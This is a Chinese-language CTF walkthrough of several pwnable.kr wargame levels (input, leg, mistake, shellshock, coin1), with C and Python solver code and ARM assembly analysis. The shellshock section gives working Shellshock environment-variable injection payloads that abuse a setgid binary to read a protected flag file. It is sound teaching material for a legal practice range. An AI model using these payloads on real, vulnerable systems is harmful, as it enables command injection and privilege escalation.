i春秋作家：W1ngs

原文来自：[pwnable.kr详细通关秘籍（二）](https://bbs.ichunqiu.com/thread-46250-1-1.html?from=beef)

 **0x00 input**

首先看一下代码：![image.png](https://image.3001.net/images/20180927/1538028919_5bac7577ab6db.png!small)![image.png](https://image.3001.net/images/20180927/1538028933_5bac7585bd0bb.png!small)

可以看到程序总共有五步，全部都满足了才可以得到flag，那我们就一步一步来看

> 这道题考到了很多linux下的基本操作，参数输入、管道符、进程间通信等知识，推荐大家可以先看看《深入理解计算机系统这本书》，补补基础

#### 1、Step1（argv）

    
    
    if(argc != 100) return 0;

也就是说输入为一百个参数，其中索引为大写A(65)的值为\x00，索引为B的值为\x20\x0a\x0d，(记得这里是索引'A'的ascii值)  
手动输入显然是不太现实的，这里我们用pwntools的process方法来实现：

![image.png](https://image.3001.net/images/20180927/1538028944_5bac759091a41.png!small)  

但是在目标的机器上没有pwntools环境，在加上后面的几步的解题方法（进程间通信、socket编程），这边还是选择c来写exp

这里就使用execve函数来传入参数和环境变量，中间的参数是指向命令行参数的指针数组，后面的一个是指向环境变量的指针数组。作用是创建一个新的进程

    
    
    int execve(const char * filename,char * const argv[ ],char * const envp[ ]);

其中的一种写法是：

    
    
        char *argv[101] = {"/home/input/input", [1 ... 99] = "A", NULL};
        argv['A'] = "\x00";
        argv['B'] = "\x20\x0a\x0d";
        argv['C'] = "55555";
    

也就是定义一个参数数组argv，长度为101个数，最后一个以空字节结尾。`argv['C'] = "55555"`在后面step5时会用到。

在本地尝试一下执行该目录下的input文件，看看参数是否正确传入

![image.png](https://image.3001.net/images/20180927/1538028951_5bac7597c6589.png!small)  

ok，参数已经正确传入，通过了第一步

  
![image.png](https://image.3001.net/images/20180927/1538028957_5bac759da75f0.png!small)  

#### 2、Step2（stdio）

step2代码的意思是向buf区输入两次的四字节，第一次从stdin输入流的得到字符，第二个从stderr输出流中得到字符（可以看我前面说过的文件描述符的用法），比较两次的字符串是否与'0xff000a00'和'0xff020a00'相同，相同则通过判断

memcmp函数：  
<https://baike.baidu.com/item/memcmp/5494788?fr=aladdin>

这里的第一个read的输入流我们是可以控制的（fd=0），但是输出流是无法控制的，这里只能用管道来解决

这一步用到了管道（pipe）的基本知识：

>
> 管道，可以抽象的理解为一根管子，一端输入进去，另一端输出出来。一端write进去，另一端read出来。而且还可以把管道的read重定向到我们的某一个流中。两个进程之间就可以通过这种方式进行通信了。就像这一步中的输入流和错误输出流。那么这个题目的思路是通过子进程将内容写入管道，父进程把管道的read重定向到输入输出流中。其实关键在与如何向错误输出流中准确写入东西。用pipe管道可能是唯一的好办法。

具体可以看一下本地的测试代码：  
![image.png](https://image.3001.net/images/20180927/1538028964_5bac75a492e69.png!small)  

在fork函数中fork出一个子进程，也就是执行if里的语句，把"hello"写到管道的一端，之后关闭管道并退出进程

然后父进程把刚刚子进程写入的数据进行读出到buf里，打印出的数据就为buf的内容"hello"，运行结果：  
![image.png](https://image.3001.net/images/20180927/1538028975_5bac75af1a5f8.png!small)画个图会更直观一些，原理的实现和现实中的管道的原理很像：一端流入一端流出![image.png](https://image.3001.net/images/20180927/1538028991_5bac75bf2da67.png!small)（这里还应该表示出子进程是父进程fork出的）

测试成功以后我们的思路就是先建立起一个管道，建立之后使用dup方法对文件描述符进行重定向，重定向到stdin和stderr中。dup函数的使用方法：  
<https://blog.csdn.net/u010006102/article/details/39667875>

代码如下：

    
    
    int pipe2stdin[2] = {-1,-1};
    int pipe2stderr[2] = {-1,-1};
    pid_t childpid;
    
    if ( pipe(pipe2stdin) < 0 || pipe(pipe2stderr) < 0){
        perror("Cannot create the pipe");
        exit(1);
    }
    
    if ( ( childpid = fork() ) < 0 ){
        perror("Cannot fork");
        exit(1);
    }
    
    if ( childpid == 0 ){
        /* Child process */
        close(pipe2stdin[0]); close(pipe2stderr[0]); // Close pipes for reading
        write(pipe2stdin[1],"\x00\x0a\x00\xff",4);   //写入管道的一端
        write(pipe2stderr[1],"\x00\x0a\x02\xff",4);
    }
    else {
                /* Parent process */
        close(pipe2stdin[1]); close(pipe2stderr[1]);   // Close pipes for writing
        dup2(pipe2stdin[0],0); dup2(pipe2stderr[0],2); // 重定向到 stdin 和 stderr
        close(pipe2stdin[0]); close(pipe2stderr[1]);   // Close write end (the fd has been copied before)
        execve("input",argv,NULL);  // 执行新的进程
    }

把第一步和第二步的代码放在一起执行，成功绕过第一二步  
![image.png](https://image.3001.net/images/20180927/1538029010_5bac75d2f2d9a.png!small)  

#### 3、Step3（env）

这步关键就一行代码：

    
    
    if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;

getenv函数的解释：  
<https://baike.baidu.com/item/getenv/935515?fr=aladdin>

环境变量是以键值对的形式存放的（name=value），getenv函数的参数为环境变量的键名，返回值是环境变量的值

  
例如我们在shell下面输入env，就会列出当前的所有环境变量：![image.png](https://image.3001.net/images/20180927/1538029025_5bac75e1f048b.png!small)  

再回过头来看看题目，代码中是`getenv("\xde\xad\xbe\xef")`，但是我们的环境变量中一般是不会有键名为\xde\xad\xbe\xef的键值对，所以这里就需要我们手动向里面写入环境变量

这里就利用到了execve函数的第三个参数，向里面传入我们自己建立的环境变量

    
    
    char *env[2] = {"\xde\xad\xbe\xef=\xca\xfe\xba\xbe", NULL};
    execve("input",argv,env);   

这里要注意的一点就是env数组的指针都是以null结尾的，所以我们必须要这么写`char *env[2] =
{"\xde\xad\xbe\xef=\xca\xfe\xba\xbe", NULL};`

把第一二三步的代码放在一起执行，成功通过前三步！  
![image.png](https://image.3001.net/images/20180927/1538029041_5bac75f165947.png!small)  

#### 4、Step4（file）

这步考到了文件流的基本操作：打开一个名为\x0a的文件，如果读入的前四个字节为空字节（\x00\x00\x00\x00），就通过判断

这里的一个比较疑惑的地方是\x0a这个文件，目录下并不存在但是还是可以正常打开，而且是返回正常：  
![image.png](https://image.3001.net/images/20180927/1538029057_5bac760174f6b.png!small)  

既然这样的话我们默认\x0a的这个文件存在，就向\x0a文件里写入\x00\x00\x00\x00，代码如下：

    
    
        FILE* fp = fopen("\x0a","w");
        fwrite("\x00\x00\x00\x00",4,1,fp);
        fclose(fp);

这里要把这几句代码写在execve函数的前面

运行发现成功通过前四步！  
![image.png](https://image.3001.net/images/20180927/1538029071_5bac760f5f53a.png!small)  

#### 5、Step5（network）

这里考的是网络编程的知识，来看一下代码：

    
    
                                    int sd, cd;
            struct sockaddr_in saddr, caddr;
            sd = socket(AF_INET, SOCK_STREAM, 0);
            if(sd == -1){
                    printf("socket error, tell admin\n");
                    return 0;
            }
            saddr.sin_family = AF_INET;
            saddr.sin_addr.s_addr = INADDR_ANY;
            saddr.sin_port = htons( atoi(argv['C']) );
            if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
                    printf("bind error, use another port\n");
                    return 1;
            }
            listen(sd, 1);
            int c = sizeof(struct sockaddr_in);
            cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
            if(cd < 0){
                    printf("accept error, tell admin\n");
                    return 0;
            }
            if( recv(cd, buf, 4, 0) != 4 ) return 0;
            if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
            printf("Stage 5 clear!\n");
    

代码的大概意思就是以该文件（input）作为服务器，监听argv['C']端口，我们上面传入的argv['C']为55555，那么就是相当于监听0.0.0.0:55555

recv函数接收客户端的输入，若输入的字符串为\xde\xad\xbe\xef，就通过判断了。

那么这里我们就只需要建立一个socket客户端，用write函数向socket对象写入\xde\xad\xbe\xef就行了。

如果对套接字编程不太熟悉的可以看这里：  
<https://blog.csdn.net/lovekun1989/article/details/41042273>

编写的代码如下：

    
    
                                    int sockfd;
            struct sockaddr_in server;
            sockfd = socket(AF_INET,SOCK_STREAM,0);
            if ( sockfd < 0){
                perror("Cannot create the socket");
                exit(1);
            }
            server.sin_family = AF_INET;
            server.sin_addr.s_addr = inet_addr("127.0.0.1");
            server.sin_port = htons(55555);
            if ( connect(sockfd, (struct sockaddr*) &server, sizeof(server)) < 0 ){
                perror("Problem connecting");
                exit(1);
            }
            printf("Connected\n");
            char buf[4] = "\xde\xad\xbe\xef";
            write(sockfd,buf,4);
            close(sockfd);

也就是以这个可执行文件作为客户端，主动连接127.0.0.1:55555，并发送字符串"\xde\xad\xbe\xef"

将前五步的代码放在一起执行，结果如下：  

![image.png](https://image.3001.net/images/20180927/1538029085_5bac761d687ee.png!small)

在本地测试都通过了，现在把代码放在服务器上运行，回到根目录下，`ls
-al`看看：![image.png](https://image.3001.net/images/20180927/1538029095_5bac7627eee0e.png!small)

只有tmp目录有可写的权限，那我们就进入tmp目录下

把文件用scp命令在本地写好的exp复制到tmp目录下：

    
    
    scp -P 2222 inputpwn.c input@pwnable.kr:/tmp

  
![image.png](https://image.3001.net/images/20180927/1538029105_5bac7631c15a6.png!small)  

把代码放上去编译执行以后会发现一个问题，代码在最后读取flag时是读取当前目录下的flag文件

    
    
                                    // here's your flag
            system("/bin/cat flag"); 

但是tmp目录下没有flag，也没有办法把flag移动到该目录下

这时候我们就要使用ln命令创建一条硬连接，ln的详细的使用看这里：  
<http://www.cnblogs.com/peida/archive/2012/12/11/2812294.html>

    
    
    ln /home/input2/flag flag

也就是相当于在该目录下"模拟"出一个目录"/home/input2/flag"下的flag

但是这里有点问题，创建硬连接时，会提示无法创建，用-s参数时，也无法正常得到flag，但是大概思路是不会错的  
![image.png](https://image.3001.net/images/20180927/1538029113_5bac76398a105.png!small)  

另外两个详细的题解：  
<https://werewblog.wordpress.com/2016/01/11/pwnable-kr-input/>  
<https://blog.csdn.net/bluestar628/article/details/69132263>

## 0x01 leg

  
题目中给了一个c源程序，一个汇编程序，汇编程序是由c编译来的，所以直接看汇编程序就行了。![image.png](https://image.3001.net/images/20180927/1538029125_5bac764510a73.png!small)main函数：![image.png](https://image.3001.net/images/20180927/1538029151_5bac765f9db14.png!small)key1函数：![image.png](https://image.3001.net/images/20180927/1538029158_5bac7666e4cf1.png!small)key2函数：![image.png](https://image.3001.net/images/20180927/1538029167_5bac766f87a86.png!small)key3函数：![image.png](https://image.3001.net/images/20180927/1538029176_5bac76781d6a7.png!small)

程序是用arm汇编语言编写的，如果只了解过intel汇编看起来会比较吃力，但是基本语法了解起来还是不难的。

基本的语法的使用可以看这里：  
<https://blog.csdn.net/smalosnail/article/details/53065048>

### 题目分析

main函数中：先调用了printf函数，接着调用scanf函数，仔细看scanf的参数为r3 = r11-#16，r1 =
r3，这里的r1为函数的参数值，也就是r11-#16

key1函数中：

    
    
    0x00008cd4 <+0>:     push    {r11}       ; (str r11, [sp, #-4]!)
       0x00008cd8 <+4>:     add r11, sp, #0
    -> 0x00008cdc <+8>:     mov r3, pc
    -> 0x00008ce0 <+12>:    mov r0, r3
       0x00008ce4 <+16>:    sub sp, r11, #0
       0x00008ce8 <+20>:    pop {r11}       ; (ldr r11, [sp], #4)
       0x00008cec <+24>:    bx  lr
    

前面的push {r11}，add r11,sp,#0，就相当于intel汇编集里的push ebp，mov esp,ebp，sub esp,xx

关键是中间的几句mov r3,pc，mov r0,r3，这里吧pc（程序计数器也就是eip）的值赋值给r0。在arm中r0就是返回值，相当于eax

> 程序计数器pc指向下两条指令的地址，也就是当前指令的地址+0x8

那么这里的r0 = pc = 0x8cdc + 0x8 = 0x8ce4

key2函数中

    
    
     0x00008cf0 <+0>:     push    {r11}       ; (str r11, [sp, #-4]!)
       0x00008cf4 <+4>:     add r11, sp, #0
       0x00008cf8 <+8>:     push    {r6}        ; (str r6, [sp, #-4]!)
       0x00008cfc <+12>:    add r6, pc, #1
       0x00008d00 <+16>:    bx  r6
    -> 0x00008d04 <+20>:    mov r3, pc
    *  0x00008d06 <+22>:    adds    r3, #4
       0x00008d08 <+24>:    push    {r3}
       0x00008d0a <+26>:    pop {pc}
       0x00008d0c <+28>:    pop {r6}        ; (ldr r6, [sp], #4)
    -> 0x00008d10 <+32>:    mov r0, r3
       0x00008d14 <+36>:    sub sp, r11, #0
       0x00008d18 <+40>:    pop {r11}       ; (ldr r11, [sp], #4)
       0x00008d1c <+44>:    bx  lr

直接追溯r0的值，0x00008d10 处r0 = r3 ，再看看r3的值，adds r  
3,#4，这条语句是把 r3 + 4h 的值存入当前状态寄存器CPSR中，并不是将r3加4存入r3，所以r3在此处的值是不变的

0x00008d04处，r3 = pc，pc = 0x00008d04 + 0x8 ，前面的pc值没有改变，所以r0 = 0x00008d04 + 0x8

key3函数中

    
    
     0x00008d20 <+0>:     push    {r11}       ; (str r11, [sp, #-4]!)
       0x00008d24 <+4>:     add r11, sp, #0
    -> 0x00008d28 <+8>:     mov r3, lr
    -> 0x00008d2c <+12>:    mov r0, r3
       0x00008d30 <+16>:    sub sp, r11, #0
       0x00008d34 <+20>:    pop {r11}       ; (ldr r11, [sp], #4)
       0x00008d38 <+24>:    bx  lr

关键就两句的代码，mov r3, lr，mov r0, r3，lr是连接寄存器 (Link Register)
，也也就调用这个函数的时候的返回地址，相当于intel里调用函数时的push eip  
可以在main函数中看到，返回值的地址值为0x00008d80

![image.png](https://image.3001.net/images/20180927/1538029192_5bac7688f3078.png!small)  

那么这里的lr = 0x00008d80，所以r0 = 0x00008d80

这样在主函数中，将三个值相加，与scanf中接收的值进行比较，相等就调用system函数  
![image.png](https://image.3001.net/images/20180927/1538029200_5bac769053149.png!small)我们将三个值进行相加，得到的结果进行输入![image.png](https://image.3001.net/images/20180927/1538029214_5bac769edfd62.png!small)计算输入得到flag![image.png](https://image.3001.net/images/20180927/1538029221_5bac76a501add.png!small)

## 0x02 mistake

连上ssh服务器后，查看代码![image.png](https://image.3001.net/images/20180927/1538029232_5bac76b0c1d04.png!small)  

重点是两个函数，一个xor函数，一个main函数，题目的意思是open一个password文件(但是password文件的内容是未知的)，再接收一个输入，将这个输入在xor函数中逐个与1异或，最后与password文件读出来的字符串进行比较

### 题目分析：

题目提示了operator priority，也就是运算符优先级，那么看到第一处的运算符处  
这一句：`if(fd=open("/home/mistake/password",O_RDONLY,0400)< 0)`

代码中<运算符的优先级是大于=的，所以先进行后面的运算，`open("/home/mistake/password",O_RDONLY,0400)< 0`  
![image.png](https://image.3001.net/images/20180927/1538029246_5bac76be7ad67.png!small)  

因为open函数正常执行时的返回值是大于0的，这里的文件是可以正常打开的，所以这条逻辑语句的值是0

然后再执行前面的=号的赋值语句，fd=0，也就是标准输入，关于文件描述符可以看我前面的文章pwnable1

也就是说我们在执行下面这条语句的时候可以将接收的字符输入到pw_buf里  
`len=read(fd,pw_buf,PW_LEN) > 0`

在scanf语句里可以输入pw_buf2的值  
`scanf("%10s", pw_buf2);`

所以这里的两个地方都可以控制，那么先输入10个0，在input password再输入1111111111，经过异或以后全为0，最后就会相等了。

### 解题步骤：

先第一个输入点输入十个0，在提示input password时，输入十个1，就会提示password OK  
![image.png](https://image.3001.net/images/20180927/1538029257_5bac76c9cc526.png!small)于是拿到flag  

## 0x03 shellshock

首先查看一下代码：  
![image.png](https://image.3001.net/images/20180927/1538029270_5bac76d6aa0d1.png!small)  

代码的逻辑很简单，调用了两个setresuid函数，也就是为shellshock可执行文件设置组用户对flag文件的读权限。

函数的具体用法可以看看这里：  
<https://blog.csdn.net/scutth/article/details/6980758>

我们ls
-al看看：![image.png](https://image.3001.net/images/20180927/1538029287_5bac76e7f2429.png!small)

发现shellshock程序的组用户被设置了s标志位，s标志位的解释可以看这里：

<https://blog.csdn.net/findstr/article/details/7330592>

普通用户对flag文件没有读取权限，但是shellshock这个可执行文件与root用户是在同一个组中，对group是具有特殊权限读(w)的，这就意味着egid是属于shellshock_pwn的，这个权限很高，对flag文件是可读的

`-r-xr-sr-x`表示SGID和同组用户权限中可执行位被设置

再回头来看看题目的名字：`shellshock`，其实这是一个bash的一个本地提权安全漏洞（破壳漏洞）  
![image.png](https://image.3001.net/images/20180927/1538029301_5bac76f5b0e6a.png!small)  

这里先给出payload:

    
    
    env x = '(){:;}; echo vulnerable'  bash -c "echo test" 

该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令

我们一段段来看：  
`env x= ''`表示向环境变量中注入`x =
....`的变量，bash在处理这样以"(){"开头的环境变量的值时并没有以函数结尾"}"为结束，而是一直执行其后的shell命令，最后就会执行"echo
vulnerable"这个语句

`bash -c 'ls'`表示调用linux下的默认shell（GNU Bourne-Again Shell）  
![image.png](https://image.3001.net/images/20180927/1538029314_5bac7702c917f.png!small)  

参考这里的[漏洞分析贴](http://www.freebuf.com/articles/system/45390.html)

这里将echo vulnerable' 换成想执行的命令 bash -c "cat ./flag"'

而./ bash -c "echo this is a test" 换成./shellshock

最后的payload：`env var='() { :;}; cat flag' ./shellshock`  
![image.png](https://image.3001.net/images/20180927/1538029330_5bac77126ba81.png!small)  

## 0x04 coin1

首先看一下题：![image.png](https://image.3001.net/images/20180927/1538029341_5bac771dea9f8.png!small)

题目的意思是猜假硬币，在一堆硬币中有一枚假硬币，假硬币的重量是9，而正常的是10。现在有N枚硬币，你可以询问C次。每次询问返回的是你询问的硬币的质量之和。询问C次之后，就要告诉它假的硬币的编号。

题目中还有一个要求是要求30秒内完成100个用例，显然这个问题要靠脚本来解决，但是在本地运行脚本的话，速度肯定是不够快的，所以题目中还给了提示：

> if your network response time is too slow, try nc 0 9007 inside pwnable.kr
> server

所以我们可以在远程服务器上写脚本，即`nc 0
9007`，登录到上一道的服务器，进入tmp目录，到脚本写到该目录下![image.png](https://image.3001.net/images/20180927/1538029355_5bac772b2be3a.png!small)  

脚本的思路就是二分法的求解，类似数据结构中设置l、mid、r三个变量

详细脚本如下：

    
    
    # coding: utf-8
    from socket import*
    import random
    import time
    HOST='0.0.0.0'
    PORT=9007
    #建立socket对象
    client=socket(AF_INET,SOCK_STREAM)
    #AF_INET表示将使用标准的ipv4地址或主机名
    #SOCK_STREAM说明这是一个TCP客户端
    
    client.connect((HOST,PORT))#连接
    data = client.recv(1024)
    time.sleep(4)
    for i in range(100):
        data = client.recv(1024)#接收数据
        int_cnt=data.find('N=')+2 #int_cnt用于找到N,C
        N=0
        C=0
        while True:     
            N+=int(data[int_cnt])
            int_cnt+=1
            if data[int_cnt]==' ':
                break
            N*=10
        int_cnt=data.find('C=')+2
        while True:     
            C+=int(data[int_cnt])
            int_cnt+=1
            if data[int_cnt]<'0' :
                break
            if data[int_cnt]>'9' :
                break
            C*=10
        print 'get N=%d'%N,'get C=%d'%C#打印N,C
        left=0
        right=N-1
        mid=(left+right)/2#二分
        for i in xrange(C):#C次询问 
            str_ask=[str(n) for n in xrange(left,mid+1)]
            str_ask=" ".join(str_ask)#构造要询问的硬币
            client.send(str_ask+"\n")#发送数据
            str_weight=client.recv(1024)#接收数据
            str_weight.split("\n")
            int_weight=int(str_weight)
            print "int_weight = ",int_weight,"l=%d mid=%d r=%d"%(left,mid,right)
            if int_weight!=((mid-left+1)*10):
                right=mid
                mid=(right+left)/2
            else:
                left=mid+1
                mid=(left+right)/2
        client.send(str(mid)+"\n")
        ans=client.recv(1024)
        print "ans=",ans
    ans=client.recv(1024)#flag
    print "ans=%s"%ans    
    client.close()

因为这道题和pwn的知识没什么多大关系，详细的脚本用法就不进行讲解了

运行脚本之后很快就跑完了，拿到flag  
![image.png](https://image.3001.net/images/20180927/1538029367_5bac7737d227e.png!small)  

## 0x05 结束语

后面的这几道题也不是很难，都是考到了linux下的许多基础知识。尤其是第一题的知识点需要多去理解，推荐《深入理解计算机系统》、《程序员的自我修养》这两本书，打pwn的基础的话看这两本就行了！

# 大家有任何问题可以提问，更多文章可到[i春秋论坛](https://bbs.ichunqiu.com/portal.php?from=beef)阅读哟~

